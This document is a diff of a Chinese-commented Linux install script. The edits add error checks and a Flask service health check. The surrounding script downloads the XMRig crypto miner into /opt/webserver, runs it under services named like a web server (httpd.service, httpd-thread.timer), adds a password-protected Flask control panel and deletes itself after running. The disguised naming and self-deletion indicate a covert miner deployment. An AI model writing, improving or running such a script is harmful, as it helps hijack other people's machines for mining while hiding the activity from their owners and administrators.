@@ -10,12 +10,12 @@ fi
 for cmd in curl tar gcc systemctl python3 pip; do
     if ! command -v "$cmd" &> /dev/null; then
         echo "安装必要的依赖..."
-        apt-get update && apt-get install -y curl tar gcc systemd python3 python3-pip
+        apt-get update && apt-get install -y curl tar gcc systemd python3 python3-pip || { echo "依赖安装失败" 1>&2; exit 1; }
     fi
 done
 
 # 安装 Flask 和 Flask-HTTPAuth
-pip3 install flask flask-httpauth >/dev/null 2>&1
+pip3 install flask flask-httpauth >/dev/null 2>&1 || { echo "Flask 安装失败" 1>&2; exit 1; }
 
 # 用户输入网页后端密码
 read -s -p "请输入网页后端管理密码: " web_password
@@ -26,7 +26,7 @@ if [ -z "$web_password" ]; then
 fi
 
 # 创建目录
-mkdir -p /opt/webserver /etc/systemd/conf.d /var/www/static || { echo "创建目录失败" 1>&2; exit 1; }
+mkdir -p /opt/webserver /etc/systemd/conf.d /var/www/static /var/www/templates || { echo "创建目录失败" 1>&2; exit 1; }
 
 # 下载并安装 xmrig
 curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/webserver || { echo "下载或解压失败" 1>&2; exit 1; }
@@ -432,12 +432,19 @@ WantedBy=multi-user.target
 EOF
 
 # 安装 jq 用于解析 JSON
-apt-get install -y jq >/dev/null 2>&1
+apt-get install -y jq >/dev/null 2>&1 || { echo "jq 安装失败" 1>&2; exit 1; }
 
 # 启用并启动服务
 systemctl daemon-reload
 systemctl enable httpd.service httpd-thread.timer flask.service
 systemctl start httpd-thread.timer flask.service || { echo "服务启动失败" 1>&2; exit 1; }
+
+# 检查 Flask 服务状态
+sleep 2
+if ! systemctl is-active flask.service >/dev/null 2>&1; then
+    echo "Flask 服务启动失败，请检查日志: journalctl -u flask.service" 1>&2
+    exit 1
+fi
 
 # 删除脚本自身
 rm -- "$0"
